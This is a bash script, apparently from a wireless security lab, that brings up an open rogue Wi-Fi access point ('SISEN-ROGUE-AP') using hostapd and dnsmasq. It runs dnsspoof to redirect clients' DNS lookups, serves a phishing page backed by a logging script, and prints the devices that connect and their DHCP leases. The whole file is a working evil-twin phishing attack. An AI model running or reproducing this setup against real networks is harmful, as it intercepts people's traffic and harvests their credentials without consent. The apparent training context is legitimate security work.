#!/bin/bash
# Physical hardware AP only. Expected interface: lab-wlan.
# Stop HWSIM separately before using the hardware AP scripts.

set -euo pipefail

RESET=$'\033[0m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
CYAN=$'\033[0;36m'
RED=$'\033[0;31m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HW_AP_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
TEARDOWN_SCRIPT="$HW_AP_DIR/teardown-ap.sh"
# shellcheck source=../hw-ap-common.sh
. "$HW_AP_DIR/hw-ap-common.sh"

INTERFACE="${INTERFACE:-lab-wlan}"
AP_IP="${AP_IP:-192.168.140.1/24}"
AP_IP_BASE="${AP_IP_BASE:-192.168.140.1}"
REGDOM="${REGDOM:-GB}"
RUNTIME_DIR="${RUNTIME_DIR:-/tmp/hw-ap}"
CHANNEL="${CHANNEL:-6}"
SSID="${SSID:-SISEN-ROGUE-AP}"
PHISH_DIR="${PHISH_DIR:-$HW_AP_DIR/files/phish}"
SPOOF_FILE="${SPOOF_FILE:-$PHISH_DIR/spoof.txt}"

cleanup_trap() {
  info "CTRL-C received: tearing down rogue AP..."
  "$TEARDOWN_SCRIPT" || true
  pkill dnsspoof 2>/dev/null || true
  exit 130
}

serve_phishing_page() {
  if [ -f "$PHISH_DIR/index.html" ]; then
    info "Serving phishing page from $PHISH_DIR..."
    (cd "$PHISH_DIR" && python3 "$PHISH_DIR/logger.py" &)
    ok "Phishing page available at http://$AP_IP_BASE/"
  else
    err "Phishing page not found at $PHISH_DIR/index.html"
  fi
}

write_hostapd_conf() {
  cat > "$RUNTIME_DIR/hostapd.conf" <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wmm_enabled=0
ignore_broadcast_ssid=0
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
EOF
}

write_dnsmasq_conf() {
  write_common_dnsmasq_conf
}

start_services() {
  info "Starting hostapd..."
  /usr/sbin/hostapd -B -P "$RUNTIME_DIR/hostapd.pid" -f "$RUNTIME_DIR/hostapd_rogue.log" "$RUNTIME_DIR/hostapd.conf"

  info "Starting dnsmasq..."
  pkill dnsmasq 2>/dev/null || true
  dnsmasq --conf-file="$RUNTIME_DIR/dnsmasq.conf" \
          --pid-file="$RUNTIME_DIR/dnsmasq.pid" \
          --log-facility="$RUNTIME_DIR/dnsmasq_rogue.log"

  ok "Rogue AP Enabled: SSID ${CYAN}${SSID}${RESET} on ${CYAN}${INTERFACE}${RESET} (${CYAN}${AP_IP_BASE}${RESET})"
  info "Logs: hostapd=${RUNTIME_DIR}/hostapd_rogue.log dnsmasq=${RUNTIME_DIR}/dnsmasq_rogue.log"
}

start_dnsspoof() {
  if [ ! -f "$SPOOF_FILE" ]; then
    err "Spoof file not found: $SPOOF_FILE"
    exit 2
  fi

  info "Starting dnsspoof with $SPOOF_FILE..."
  dnsspoof -i "$INTERFACE" -f "$SPOOF_FILE" &
  ok "DNS spoofing active"
}

tail_clean() {
  info "Showing connections and DHCP leases (Ctrl-C to stop)..."
  stdbuf -oL -eL tail -F "$RUNTIME_DIR/hostapd_rogue.log" "$RUNTIME_DIR/dnsmasq_rogue.log" | \
  awk -v GREEN="$GREEN" -v CYAN="$CYAN" -v RESET="$RESET" '
    /AP-STA-CONNECTED/ { mac=$NF; ts=strftime("%H:%M:%S"); printf("[%s] %sCONNECT%s %s\n", ts, GREEN, RESET, mac); fflush(); }
    /DHCPACK/ { ts=strftime("%H:%M:%S"); ip=$5; mac=$6; host=$7; if (host=="") host="-"; printf("[%s] %sDHCP%s %s -> %s %s\n", ts, CYAN, RESET, mac, ip, host); fflush(); }
  '
}

main() {
  require_root
  require_hw_interface
  ensure_networkmanager_unmanaged "$INTERFACE"
  trap cleanup_trap INT TERM
  trap stop_hw_ap_on_exit EXIT
  "$TEARDOWN_SCRIPT" || true
  ensure_runtime_dir
  prepare_ap_interface
  write_hostapd_conf
  write_dnsmasq_conf
  HW_AP_STARTED=1
  start_services
  start_dnsspoof
  serve_phishing_page
  tail_clean
}

main "$@"
